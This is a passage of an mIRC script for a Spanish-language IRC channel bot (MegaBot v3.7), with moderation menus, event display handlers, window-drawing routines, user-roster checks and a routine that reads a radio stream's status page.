;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;
; MegaBot v3.7 Trabajo realizado por:
; David Hidalgo Marsal [RoK] (ProgramaciÛn del bot)
; David Quintana Del Castillo [Dqc] (DiseÒo y gr·ficos)
; Publicado: 29/01/2007
; ActualizaciÛn publica: 03/08/2014
; E-mail: rokmarsal@gmail.com
; Web: Www.MainCenter.Ya.St & Www.MainCenter.eS
;
; Queda totalmente prohibida la copia sin el permiso de
; Sus Autores. Prohibido Modificar el codigo del Bot "Copiar no es la soluciÛn"
; Los autores no se hacen responsables de los daÒos que pueda causar el usuario.
;
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Alias F1 { clear }
Menu channel {
  Modos
  .+R (Solo entran nicks registrados): if ($me isop $chan) { mode $chan +R }
  .-R: if ($me isop $chan) { mode $chan -R }
  .+RM (Solo entran y hablan nicks registrados): if ($me isop $chan) { mode $chan +RM }
  .-RM: if ($me isop $chan) { mode $chan -RM }
  .+m (Solo hablan voices y arrobas): if ($me isop $chan) { mode $chan +m }
  .-m: if ($me isop $chan) { mode $chan -m }
}
Menu nicklist {
  Control
  .Kickear a $1: if ($me isop $chan) { var %bk.m $$?"Motivo del kick?" | if (%bk.m) { kick $chan $1 %bk.m } }
  .-
  .Modo +o $1 (op): if ($me isop $chan) { mode $chan +ooooo $1- }
  .Modo -o $1 (deop): if ($me isop $chan) { mode $chan -ooooo $1- }
  .-
  .Modo +v $1 (voice): if ($me isop $chan) { mode $chan +vvvvv $1- }
  .Modo -v $1 (devoice): if ($me isop $chan) { mode $chan -vvvvv $1- }
  .-
  .Modo +o-v $1 (op-devoice): if ($me isop $chan) { mode $chan +o-v+o-v $1 $1 $2 $2 }
  .Modo -o+v $1 (deop-voice): if ($me isop $chan) { mode $chan -o+v-o-v $1 $1 $2 $2 }
  .-
  .Modo +o+v $1 (op-voice): if ($me isop $chan) { mode $chan +o+v+o+v $1 $1 $2 $2 }
  .Modo -o-v $1 (deop-devoice): if ($me isop $chan) { mode $chan -o-v-o-v $1 $1 $2 $2 }
  .-
  .Modo +b+k $address($1,2) (ban-kick): if ($me isop $chan) { var %bk.m $$?"Motivo del ban-kick?" | if (%bk.m) { mode $chan -o+b $1 $address($1,2) | kick $chan $1 %bk.m | if ($2) { mode $chan -o+b $2 $address($2,2) | kick $chan $2 %bk.m } } }
  .Modo +bb+k $1 $address($1,2) (ban-kick): if ($me isop $chan) { var %bk.m $$?"Motivo del ban-kick?" | if (%bk.m) { mode $chan -o+bb $1 $1 $address($1,2) | kick $chan $1 %bk.m | if ($2) { mode $chan -o+bb $2 $2 $address($2,2) | kick $chan $2 %bk.m } } }
  .-
  .Modo +b $address($1,2) (ban): if ($me isop $chan) { mode $chan -o+b $1 $address($1,2) }
  .Modo +bb $1 $address($1,2) (ban): if ($me isop $chan) { mode $chan -o+bb $1 $1 $address($1,2) }
}
On ^*:TEXT:*:*:{
  if ($mid($target,1,1) == $chr(35)) {
    if ($mid($nick($target,$nick).pnick,1,1) != $mid($nick,1,1)) { echo $target 12[02 $+ $time $+ 12] 6 $+ $mid($nick($target,$nick).pnick,1,1) $+ 2 $+ $nick $+ : $1- }
    else { echo $target 12[02 $+ $time $+ 12] 2 $+ $nick $+ : $1- }
  }
  else { echo $nick 12[02 $+ $time $+ 12] 2 $+ $nick $+ : $1- }
  haltdef
}
On ^*:RAWMODE:#:{ echo $chan 4[02 $+ $time $+ 4]12 $nick 2P2one 2M2oDo5:10 $1 12 $+ $2- | haltdef }
On ^*:QUIT:{
  if ($query($nick)) { echo $nick 14[02 $+ $time $+ 14] 14C14ierra2 $nick 3[14R14azÛn12 $1- $+ 3] }
  var %Quit 1
  while ($comchan($nick,%Quit)) {
    if ($comchan($nick,%Quit)) { echo $comchan($nick,%Quit) 14[02 $+ $time $+ 14] 14C14ierra2 $nick 3[14R14azÛn12 $1- $+ 3] }
    inc %Quit
  }
  haltdef
}
On ^*:KICK:#:{ echo $chan 4[02 $+ $time $+ 4]12 $nick 2expulsa a4 $knick $+ : $1- | haltdef }
On ^*:JOIN:#:{ if ($nick == $me) { echo $chan 6[50 $+ $time $+ 6]2 Has entrado en12 $chan $+ . } | else { echo $chan 6[50 $+ $time $+ 6] 3E3ntra12 $nick 2(03 $+ $iif($address($nick,1),$remove($address($nick,1),*!*),desconocida) $+ 2) } | haltdef }
On ^*:PART:#:{ echo $chan 6[50 $+ $time $+ 6] 2S3ale12 $nick 2(03 $+ $iif($address($nick,1),$remove($address($nick,1),*!*),desconocida) $+ 2) | haltdef }
raw 332:*:{ echo $2 6[50 $+ $time $+ 6] 2T2OPIC: $3- | haltdef }
raw 333:*:{ echo $2 6[50 $+ $time $+ 6] 2P2uesto por:3 $3 6(12 $+ $asctime($4) $+ 6) | haltdef }
raw 401:*:{ if ($query($2)) { echo $2 14[02 $+ $time $+ 14]2 $2 14No esta en el IRC. } | haltdef }
raw 432:*:{ nick %NICKB }
On ^*:NICK:{
  if ($nick != $me) {
    if ($query($newnick)) { echo $newnick 4[02 $+ $time $+ 4]12 $nick 2es ahora12 $newnick }
    var %camnick 1
    while ($comchan($newnick,%camnick)) {
      if ($comchan($newnick,%camnick)) { echo $comchan($newnick,%camnick) 4[02 $+ $time $+ 4]12 $nick 2es ahora12 $newnick }
      inc %camnick
    }
  }
  haltdef
}
;on *:LOGON:*:{ if (ChatZona isin $server) || ($network == ChatZona) { chatzona.p } }
alias chatzona.p { disconnect | sockclose MegaBOT | .partall | unset %conb | tit | if (%emisora.st) { emon.is } | if (%act == @conexion) { datv-conexion } | set %err.l1 Lo siento, la Red ChatZona | set %err.l2 No est· soportada. | error }
alias TIT {
  .timertit* off
  titlebar
  %titlebar = MegaBOT v3.7 - By RoK & dqc - 2007-2013 - Estado: $iif(%conb == $null,Desconectado,Conectado) - Www.MainCenter.eS - Ultima actualizaciÛn: $iif(%mactdpnbd,$gettok(%mactdpnbd,2-4,32),No se ha actualizado)
  if ($r(0,100) >= 50) { %titlebar.m = _ }
  else { %titlebar.m = / }
  %titlebar1 = 1
  %titlebar2 = 50
  while ($mid(%titlebar,%titlebar1,1) != $null) {
    .timertit. $+ %titlebar1 -om 1 %titlebar2 titlebar $left(%titlebar,%titlebar1) $+ %titlebar.m
    inc %titlebar2 50
    inc %titlebar1
  }
  .timertitfin -om 1 $calc(%titlebar2 + 100) titlebar %titlebar
}
Alias datv-conexion {
  if ($window(@MegaBOT).state) && (%act.m == 1) {
    set %NICKBP $remove(%NICKBP,$chr(32)) | set %NICKB $remove(%NICKB,$chr(32)) | drawv MegaBOT conexion.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | if (%m.cn == dsc) { drtex MegaBOT 19 395 445 Deshacer cambios } | if (%m.cn == dc) { drtex MegaBOT 19 408 445 DESCONECTAR } | if (%m.cn == cn) { drtex MegaBOT 19 428 445 CONECTAR } | if (%m.cn == gr) { drtex MegaBOT 19 388 445 Guardar ConfiguraciÛn }
    if (%conb) { drtex MegaBOT 19 405 345 C o n e c t a d o } | else { drtex MegaBOT 19 385 345 D e s C o n e c t a d o }
    if (%SERVIDOR) { drtex MegaBOT 19 355 145 $estx(355,610,Times-New-Roman,19,%SERVIDOR) } | if (%PROXY) { drtex MegaBOT 19 323 185 $estx(323,610,Times-New-Roman,19,%PROXY) } | if (%NICKB) { drtex MegaBOT 19 399 225 $estx(399,610,Times-New-Roman,19,%NICKB) } | if (%NICKBP) { drtex MegaBOT 19 419 265 $estx(419,610,Times-New-Roman,19,$str(*,$len(%NICKBP))) } | if (%AUTOC) { drtex MegaBOT 19 495 305 %AUTOC } | drawdot @MegaBOT
  }
}
Alias trozwin {
  window -c @ $+ $2 | window -lh @ $+ $2 | :p | clear @ $+ $2 | unset %swn %swn2 %swnn | unset %swn3 %swn.l %swn4 | unset %swn5 | window -h @ $+ $2
  :1 | if (%swn >= $line( @ $+ $1 ,0)) { window -c @ $+ $1 | return } | inc %swn | set %swnn $line( @ $+ $1 ,%swn) | if (!$gettok(%swnn,1,32)) { aline @ $+ $2  | goto 1 } | unset %swn3 %swn.l | :2
  if (%swn3 >= $gettok(%swnn,0,32)) { if (%swn.l) { aline @ $+ $2 %swn.l } | goto 1 } | inc %swn3 | set %swn.l %swn.l $gettok(%swnn,%swn3,32) | set %swn4 $gettok(%swnn,%swn3,32)
  if ($width(%swn4,$3,$4) >= $calc( $6 - $5 )) { unset %swn5 | :3 | inc %swn5 | if ($width($mid(%swn4,1,%swn5),$3,$4) >= $calc( $6 - $5 )) { rline @ $+ $1 %swn $replace(%swnn,%swn4,$mid(%swn4,1,$calc(%swn5 - 1)) $mid(%swn4,%swn5,$len(%swn4))) | set %swnn $line( @ $+ $1 ,%swn) | unset %swn3 %swn.l | goto 2 } | goto 3 }
  if ($width(%swn.l,$3,$4) >= $calc( $6 - $5 )) { set %swn.l $deltok(%swn.l,$gettok(%swn.l,0,32),32) | aline @ $+ $2 %swn.l | if ($gettok(%swnn,%swn3,32)) { set %swnn $gettok(%swnn,%swn3 $+ -,32) | unset %swn3 %swn.l | goto 2 } } | goto 2
}
Alias ezit { if ($server) { set %ezit o | quit %logo } | else { ezit.vnt t } }
Alias ezit.vnt { wc dcomand | wc c-l | wc SERVIDOR | wc sact | wc dcont | wc dact | wc PROXY | wc NICKB | wc emisora.ipm | wc emisora.ip | wc emisora.port | wc emisora.sg | wc snot | wc NICKBP | wc CA.C | wc CA.P | wc CA.M | wc USER.PROT | wc USER.PASS | wc pro.u | wc pro.p | wc contacto.n | wc contacto.a | wc contacto.e | wc contacto.m | if ($1 == t) { wc protegido | wc salir | wc MegaBOT | .timerexit 1 4 exit } }
Alias ezit.edit { wc dcomand | wc SERVIDOR | wc sact | wc PROXY | wc NICKB | wc emisora.ipm | wc emisora.ip | wc emisora.port | wc emisora.sg | wc snot | wc NICKBP | wc CA.C | wc CA.P | wc CA.M | wc USER.PROT | wc USER.PASS | wc pro.u | wc pro.p | wc contacto.n | wc contacto.a | wc contacto.e | wc contacto.m | if ($1 == t) { wc protegido | wc salir | wc MegaBOT | .timerexit 1 4 exit } }
alias rv2 { if ($me isop $1) && ($2 !ison $1) && ($me ison $1) { invite $2 $1 } }
Alias datv-principal { if ($window(@MegaBOT).state) && (%act.m == 1) { drawv MegaBOT principal.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | if ($crc(Sistema\jpg\vent\principal.jpg) == 067653A8) && ($file(Sistema\jpg\vent\principal.jpg) == 237104) { drawcopy @MegaBOT 403 221 178 14 @MegaBOT 418 220 | drawcopy @MegaBOT 379 130 14 14 @MegaBOT 405 220 } | drawdot @MegaBOT } }
Alias mrpr { if (% [ $+ [ $decode(cHJjdA==,m) ] ]) { halt } }
Alias dath-principal { return }
Alias datv-canales { dath-canales }
Alias dath-canales {
  if ($window(@MegaBOT).state) && (%act.m == 1) {
    drawv MegaBOT canales.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | set %CA.C $remove(%CA.C,$chr(32)) | set %CA.P $remove(%CA.P,$chr(32)) | if (%CA.M != $null) { drtex MegaBOT 19 331 97 $estx(331,615,Times-New-Roman,19,%CA.M) }
    if (%CA.C) { drtex MegaBOT 19 331 129 $estx(331,615,Times-New-Roman,19,%CA.C) } | if (%CA.P) { drtex MegaBOT 19 331 161 $estx(331,615,Times-New-Roman,19,$str(*,$len(%CA.P))) }
    if (%m.cn == a) { drtex MegaBOT 19 297 406 AÒadir\Substituir } | if (%m.cn == q) { drtex MegaBOT 19 335 406 Quitar } | if (%m.cn == e) { drtex MegaBOT 19 335 406 Editar }
    %sjbs = Sistema\jpg\bot\scan.jpg | if (%cl == 1) { drawpic -cn @MegaBOT 242 240 %sjbs } | drtex MegaBOT 19 245 241 $estx(245,609,Times-New-Roman,19,$hget(canales,1).item) | if (%cl == 2) { drawpic -cn @MegaBOT 242 268 %sjbs }
    drtex MegaBOT 19 245 269 $estx(245,609,Times-New-Roman,19,$hget(canales,2).item) | if (%cl == 3) { drawpic -cn @MegaBOT 242 296 %sjbs }
    drtex MegaBOT 19 245 297 $estx(245,609,Times-New-Roman,19,$hget(canales,3).item) | if (%cl == 4) { drawpic -cn @MegaBOT 242 324 %sjbs }
    drtex MegaBOT 19 245 325 $estx(245,609,Times-New-Roman,19,$hget(canales,4).item) | if (%cl == 5) { drawpic -cn @MegaBOT 242 352 %sjbs }
    drtex MegaBOT 19 245 353 $estx(245,609,Times-New-Roman,19,$hget(canales,5).item) | drawdot @MegaBOT
  }
}
Alias datv-proteccion { if ($window(@MegaBOT).state) && (%act.m == 1) { drawv MegaBOT proteccion.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | %uprt = $decode($decode($hget(prote,u),m),m) | if (%uprt) { drtex MegaBOT 19 355 201 $estx(355,610,Times-New-Roman,19,%uprt) } | if (%USER.PASS) { drtex MegaBOT 19 355 241 $estx(355,610,Times-New-Roman,19,%USER.PASS) } | if (%m.cn == a) { drtex MegaBOT 19 443 410 ACTIVAR } | if (%m.cn == d) { drtex MegaBOT 19 422 410 DESACTIVAR } | if (%m.cn == b) { drtex MegaBOT 19 433 410 BLOQUEAR } | if ($hget(prote,segr)) { drtex MegaBOT 19 463 283 ACTIVADA } | else { drtex MegaBOT 19 445 283 DESACTIVADA } | drawdot @MegaBOT } }
Alias dath-proteccion { return }
Alias datv-protegido { if ($window(@protegido).state) { drawv protegido protegido.jpg | if (%pro.u) { drtex protegido 19 178 252 $estx(178,361,Times-New-Roman,19,%pro.u) } | if (%pro.p) { drtex protegido 19 178 278 $estx(178,361,Times-New-Roman,19,$str(*,$len(%pro.p))) } | drawdot @protegido } }
Alias dath-protegido { return }
Alias dath-error { return }
Alias dath-men { return }
Alias datv-men { if ($window(@men).state) { drawv men men.jpg | drtex men 19 172 112 %men-act-text1 | drtex men 19 172 132 %men-act-text2 | drtex men 19 172 152 %men-act-text3 | drtex men 19 172 172 %men-act-text4 | drtex men 19 172 222 %men-act-text5 | drawdot @men } }
Alias datv-error { if ($window(@error).state) { drawv error error.jpg | drtex error 19 172 140 %err.l1 | drtex error 19 172 160 %err.l2 | drtex error 19 172 180 %err.l3 | drtex error 19 172 200 %err.l4 | drtex error 19 172 220 %err.l5 | drtex error 19 172 240 %err.l6 | drtex error 19 172 260 %err.l7 | unset %err.l* | drawdot @error } }
Alias dath-conexion { set %SERVIDOR $hget(conexion,serv) | set %PROXY $hget(conexion,proxy) | set %NICKB $hget(conexion,NICKB) | set %NICKBP $hget(conexion,NICKBP) | set %AUTOC $hget(conexion,AUTOC) | datv-conexion }
Alias datv-descargas { if ($window(@MegaBOT).state) { drawv MegaBOT descargas.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | drtex MegaBOT 19 231 165 $estx(231,564,Times-New-Roman,19,%DIRCOMP1) | drtex MegaBOT 19 231 217 $estx(231,564,Times-New-Roman,19,%DIRCOMP2) | drtex MegaBOT 19 231 269 $estx(231,564,Times-New-Roman,19,%DIRCOMP3) | drtex MegaBOT 19 231 321 $estx(231,564,Times-New-Roman,19,%DIRCOMP4) | drtex MegaBOT 19 230 373 $estx(230,564,Times-New-Roman,19,%DIRCOMP5) | drtex MegaBOT 19 231 425 $estx(231,564,Times-New-Roman,19,%DIRCOMP6) | drawdot @MegaBOT } }
Alias sskcr { .timerc-l.mous off | window -c @c-l | window -c @noticias | sockclose noticias | sockclose contacto.* | unset %sbjcb | .timersbjcb off }
Alias estx { if ($1 != $null) && ($2 != $null) && ($3 != $null) && ($4 != $null) && ($5 != $null) { unset %estx %estx2 | :1 | inc %estx | if ($width(%estx2,$3,$4) == $calc($2 - $1)) { return %estx2 } | if ($width(%estx2,$3,$4) >= $calc($2 - $1)) { set %estx2 $mid(%estx2,1,$calc($len(%estx2) - 1)) | return %estx2 } | if (%estx > $len($5-)) { return %estx2 } | if ($mid($5-,%estx,1) == $chr(32)) { set %estx2 %estx2 $chr(32) | goto 1 } | set %estx2 %estx2 $+ $mid($5-,%estx,1) | goto 1 } }
Alias datv-skins {
  if ($window(@MegaBOT).state) && (%act.m == 1) {
    drawv MegaBOT skins.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | if (%skns.ef == q) { drtex MegaBOT 19 355 433 Eliminar } | if (%skns.ef == c) { drtex MegaBOT 19 355 433 Cancelar } | if (%skns.ef == a) { drtex MegaBOT 19 355 433 Aceptar }
    if (%skns.ef == b) { drtex MegaBOT 19 345 433 Bajar scroll } | if (%skns.ef == s) { drtex MegaBOT 19 345 433 Subir scroll } | skins.list | drawdot @MegaBOT
  }
}
alias skins.sb {
  if (!%skins.scrl) { set %skins.scrl 1 } | set %skins.list1 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,%skins.scrl,1))))
  set %skins.list2 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 1),1)))
  set %skins.list3 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 2),1)))
  set %skins.list4 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 3),1)))
  set %skins.list5 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 4),1)))
  set %skins.list6 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 5),1)))
  set %skins.list7 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 6),1)))
  set %skins.list8 $estx(232,590,Times-New-Roman,19,$nopath($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 7),1)))
}
Alias rvm {
  if ($me ison $1) && ($2) {
    unset %status* | :1 | if (%status.n >= $hget(i- $+ $1,0).item) { inc %status.fa 3 | .timerRVIFN- $+ $1 1 %status.fa unset %rvm- $+ $1 | .timerRVmFN2- $+ $1 1 %status.fa msg $iif($3,$3,$1) $iif(%status.fa == 3,2No falta nadie 12][,2 $+ $chr(40) $+ $pn00($duration($calc($ctime - $2))) $+ 2 $+ $chr(41)) 2RVM2 Finalizado. | halt }
    inc %status.n | if ($hget(i- $+ $1,%status.n).item !ison $1) && ($hget(i- $+ $1,%status.n).item) && ($gettok($hget(r- $+ $1,$hget(i- $+ $1,%status.n).item),1,32) > $hget(l- $+ $1,NOJOIN)) { inc %status.fa 8 | .timerrmvs- $+ $1 $+ $hget(i- $+ $1,%status.n).item 1 %status.fa msg $hget(i- $+ $1,%status.n).item %rvmsg- [ $+ [ $1 ] ] } | goto 1
  }
}
alias skins.list {
  if (%skins.nm == 1) && (%skins.list1) { drawpic -cn @MegaBOT 227 138 %sjbs } | drtex MegaBOT 19 232 140 %skins.list1 | if (%skins.nm == 2) && (%skins.list2) { drawpic -cn @MegaBOT 227 168 %sjbs } | drtex MegaBOT 19 232 170 %skins.list2
  if (%skins.nm == 3) && (%skins.list3) { drawpic -cn @MegaBOT 227 198 %sjbs } | drtex MegaBOT 19 232 200 %skins.list3 | if (%skins.nm == 4) && (%skins.list4) { drawpic -cn @MegaBOT 227 228 %sjbs } | drtex MegaBOT 19 232 230 %skins.list4
  if (%skins.nm == 5) && (%skins.list5) { drawpic -cn @MegaBOT 227 258 %sjbs } | drtex MegaBOT 19 232 260 %skins.list5 | if (%skins.nm == 6) && (%skins.list6) { drawpic -cn @MegaBOT 227 288 %sjbs } | drtex MegaBOT 19 232 290 %skins.list6
  if (%skins.nm == 7) && (%skins.list7) { drawpic -cn @MegaBOT 227 318 %sjbs } | drtex MegaBOT 19 232 320 %skins.list7 | if (%skins.nm == 8) && (%skins.list8) { drawpic -cn @MegaBOT 227 348 %sjbs } | drtex MegaBOT 19 232 350 %skins.list8
}
Alias sknsb {
  if ($mouse.y) && ($mouse.x) {
    if ($1 == b) { if ($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl + 8),1) != $null) { inc %skins.scrl | skins.sb | datv-skins | .timersbskins -m 1 70 sknsb $1 } }
    if ($1 == s) { if ($findfile(Sistema\skins,*.zip;*.rar,$calc(%skins.scrl - 8),1) != $null) { dec %skins.scrl | skins.sb | datv-skins | .timersbskins -m 1 70 sknsb $1 } }
  }
}
Alias ci.ac {
  unset %ci.ac %ci.ac2 %ci.ac3
  set %ci.ac4 $2 $1 $3 $4
  hfree -w i- $+ $1
  hmake i- $+ $1
  set %statuz o
  :1
  if (%ci.ac >= $hget(r- $+ $1,0).item) {
    if (%ci.ac2) {
      inc %ci.ac3 3
      .timerison- $+ $1 $+ %ci.ac3 1 %ci.ac3 ison %ci.ac2
    }
  }
  else {
    inc %ci.ac
    set %ci.ac2 %ci.ac2 $hget(r- $+ $1,%ci.ac).item
    if ($gettok(%ci.ac2,0,32) >= 40) {
      inc %ci.ac3 4
      .timerison- $+ $1 $+ %ci.ac3 1 %ci.ac3 ison %ci.ac2
      unset %ci.ac2
    }
    goto 1
  }
}
Alias datv-contacto {
  if ($window(@MegaBOT).state) && (%act.m == 2) {
    drawv MegaBOT contacto.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | if (%contacto.n) { drtex MegaBOT 19 449 129 $estx(449,626,Times-New-Roman,19,%contacto.n) }
    if (%contacto.e) { drtex MegaBOT 19 449 157 $estx(449,626,Times-New-Roman,19,%contacto.e) }
    if (%contacto.a) { drtex MegaBOT 19 449 185 $estx(449,626,Times-New-Roman,19,%contacto.a) }
    unset %ccont | set %cont 199 | :1 | if (%cont >= 370) || (%cnott >= $line(@dcont,0)) { unset %cont %ccont }
    else { inc %ccont | if ($calc(%ccont - 1) >= %cconts) { inc %cont 20 | drtex MegaBOT 17 352 %cont $strip($line(@dcont,%ccont)) } | goto 1 }
    if (%sndmel == o) { drtex MegaBOT 19 437 73 °Mensaje enviado! } | if (%sndmel == f) { drtex MegaBOT 19 443 73 °Envio fallido! }
    if (%m.cn == e) { drtex MegaBOT 19 295 433 ENVIAR E-MAIL } | if (%m.cn == c) { drtex MegaBOT 19 313 433 CANCELAR }
    if (%m.cn == b) { drtex MegaBOT 19 297 433 BAJAR SCROLL } | if (%m.cn == s) { drtex MegaBOT 19 297 433 SUBIR SCROLL } | drawdot @MegaBOT
  }
}
Alias rvi {
  if ($me ison $1) && ($2) && ($me isop $1) {
    unset %status*
    :1
    if (%status.n >= $hget(i- $+ $1,0).item) {
      inc %status.fa 3
      .timerRVIFN- $+ $1 1 %status.fa unset %rvi- $+ $1
      .timerRVIFN2- $+ $1 1 %status.fa msg $iif($3,$3,$1) $iif(%status.fa == 3,2No falta nadie 12][,2 $+ $chr(40) $+ $pn00($duration($calc($ctime - $2))) $+ 2 $+ $chr(41)) 2RVI2 Finalizado.
      halt
    }
    inc %status.n
    if ($hget(i- $+ $1,%status.n).item !ison $1) && ($hget(i- $+ $1,%status.n).item) && ($gettok($hget(r- $+ $1,$hget(i- $+ $1,%status.n).item),1,32) > $hget(l- $+ $1,NOJOIN)) {
      inc %status.fa 8
      .timerrvs- $+ $1 $+ $hget(i- $+ $1,%status.n).item 1 %status.fa rv2 $1 $hget(i- $+ $1,%status.n).item
    }
    goto 1
  }
}
Alias dath-skins { return }
Alias datv-estado {
  if ($window(@MegaBOT).state) && (%act.m == 2) {
    drawv MegaBOT estado.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | if (%conb) { drtex MegaBOT 19 473 121 Conectado } | else { drtex MegaBOT 19 458 121 DesConectado }
    if ($hget(prote,segr)) { drtex MegaBOT 19 484 149 Activada } | else { drtex MegaBOT 19 468 149 DesActivada }
    if (%DIRCOMP1) || (%DIRCOMP2) || (%DIRCOMP3) || (%DIRCOMP4) || (%DIRCOMP5) || (%DIRCOMP6) { drtex MegaBOT 19 480 177 Activadas }
    else { drtex MegaBOT 19 463 177 DesActivadas } | if (%emisora.st) { drtex MegaBOT 19 483 205 Activada }
    else { drtex MegaBOT 19 469 205 DesActivada } | drtex MegaBOT 19 510 262 $send(0) | carg.dcct
    if (%dcctpt1) { drtex MegaBOT 19 435 290 %dcctpt1 ( $+ $dccms($send(%dcctpt1)) $+ ) } | if (%dcctpt2) { drtex MegaBOT 19 435 318 %dcctpt2 ( $+ $dccms($send(%dcctpt2)) $+ ) }
    if (%dcctpt3) { drtex MegaBOT 19 435 346 %dcctpt3 ( $+ $dccms($send(%dcctpt3)) $+ ) } | if (%dcctpt4) { drtex MegaBOT 19 435 374 %dcctpt4 ( $+ $dccms($send(%dcctpt4)) $+ ) }
    if (%dcctpt5) { drtex MegaBOT 19 435 402 %dcctpt5 ( $+ $dccms($send(%dcctpt5)) $+ ) } | drawdot @MegaBOT
  }
}
Alias carg.dcct { unset %dcctp* | %d = 0 | while (%d < $send(0)) { inc %d | if (!$findtok(%dcctpt,$send(%d),32)) { set %dcctpt [ $+ [ %d ] ] $send(%d) } | set %dcctpt %dcctpt $send(%d) } }
Alias c-cmd {
  window -c @c-l | window +d @c-l $calc(224 + $gettok(%mbot.dim,1,32)) $calc(144 + $gettok(%mbot.dim,2,32)) 400 285
  echo @c-l $dll(%RHDl $+ nHTMLn.dll,attach,$window(@c-l).hwnd)
  echo @c-l $dll(%RHDl $+ nHTMLn.dll,navigate,$mircdirSistema\base\Comandos.htm)
  window -ha @c-l
}
Alias undlls { %undlls = 1 | while ($dll(%undlls)) { dll -u $dll(%undlls) | inc %undlls } }
Alias status {
  if ($me ison $1) && ($2) {
    unset %status* | inc %status.i | set %status.f 0 | :1
    if (%status.n >= $hget(i- $+ $1,0).item) {
      unset %status.cp | if (%status.f != 0) { msg $iif($3,$3,$1) 2Este canal tiene12 $hget(r- $+ $1,0).item 2registros. 2Faltan4 %status.f 2usuarios: }
      :2
      inc %status.cp
      if (!%status.us. [ $+ [ %status.cp ] ]) { msg $iif($3,$3,$1) $iif(%status.f == 0,2No falta nadie 12][,2 $+ $chr(40) $+ $pn00($duration($calc($ctime - $2))) $+ 2 $+ $chr(41)) 2STATUS2 Finalizado. | halt }
      msg $iif($3,$3,$1) 3 $+ %status.us. [ $+ [ %status.cp ] ]
      goto 2
    }
    inc %status.n
    if ($gettok(%status.us. [ $+ [ %status.i ] ],0,32) >= 12) { inc %status.i }
    if ($hget(i- $+ $1,%status.n).item !ison $1) && ($hget(i- $+ $1,%status.n).item) && ($gettok($hget(r- $+ $1,$hget(i- $+ $1,%status.n).item),1,32) > $hget(l- $+ $1,NOJOIN)) { inc %status.f | set %status.us. [ $+ [ %status.i ] ] %status.us. [ $+ [ %status.i ] ] $hget(i- $+ $1,%status.n).item $+ :6 $gettok($hget(r- $+ $1,$hget(i- $+ $1,%status.n).item),1,32) $+ 3 }
    goto 1
  }
}
Alias datv-comandos {
  if ($window(@MegaBOT).state) && (%act.m == 2) {
    drawv MegaBOT comandos.jpg | drtex MegaBOT 18 50 445 MegaBOT 3.7 | unset %ccomdt | set %comdt 140 | :1 | if (%comdt >= 390) || (%ccomdt >= $line(@dcomand,0)) { unset %comdt %ccomdt }
    else { inc %ccomdt | if ($calc(%ccomdt - 1) >= %ccomdts) { inc %comdt 20 | drtex MegaBOT 15 242 %comdt $strip($line(@dcomand,%ccomdt)) } | goto 1 } | drawdot @MegaBOT
  }
}
Alias datv-noticias {
  if ($window(@MegaBOT).state) && (%act.m == 2) {
    drawv MegaBOT noticias.jpg 
    drtex MegaBOT 18 50 445 MegaBOT 3.7
    if (%ntcse) { drtex MegaBOT 19 443 73 °Fallo al conectar! }
    if ($sock(noticias).status == active) { drtex MegaBOT 19 443 73 Actualizando.. }
    unset %ccntt | set %cntt 108 | :1 | if (%cntt >= 360) || (%ccntt >= $line(@dnot,0)) { unset %cntt %ccntt }
    else { inc %ccntt | if ($calc(%ccntt - 1) >= %sclnoticis) { inc %cntt 20 | drtex MegaBOT 15 231 %cntt $strip($line(@dnot,%ccntt)) } | goto 1 } | drawdot @MegaBOT
  }
}
on *:sockopen:emon:{
  if ( $sockerr > 0 ) {
    if (%act == @emisora) { datv-emisora }
  }
  else {
    emon2delrad
    unset %emisorap5 %emisorap2 %emisorap1 %emisorap4 %emisorap3
    sockwrite -n $sockname GET /index.html HTTP/1.0
    sockwrite -n $sockname User-Agent: Mozilla/4.0
    sockwrite -n $sockname Host: $sock($sockname,1).ip $+ : $+ $sock($sockname,1).port
    sockwrite -n $sockname $crlf
  }
}
on *:sockread:emon:{ sockread &emon2 | bwrite emon2.x -1 &emon2 }
alias emon2delrad { if ($exists(emon2.x) == $true) { .remove emon2.x } }
on *:sockclose:emon:{
  if ($exists(emon2.x) == $true) {
    dll %RHDl $+ breaker.dll breakhtml emon2.x
    %a = 1
    while ($lines(emon2.x) >= %a) {
      %emon2 = $html($read(emon2.x,%a))
      if (%emon2 == Stream Status:) { inc %a 4 | set %emisorap5 $gettok($html($read(emon2.x,%a)),5,32) | set %emisorap4 $gettok($html($read(emon2.x,%a)),8,32) }
      if (%emon2 == Stream Title:) { inc %a 4 | set %emisorap1 $html($read(emon2.x,%a)) }
      if (%emon2 == Stream Genre:) { inc %a 4 | set %emisorap3 $html($read(emon2.x,%a)) }
      if (%emon2 == Current Song:) { inc %a 4 | set %emisorap2 $html($read(emon2.x,%a)) }
      inc %a
    }
    emon2delrad | emon.i
  }
}
Alias emon.i {
  if (%act == @emisora) { datv-emisora }
  if ($chan(1)) {
    if (%emisorap5) || (%emisorap2) || (%emisorap1) || (%emisorap4) || (%emisorap3) {
      unset %emisoraanuncia
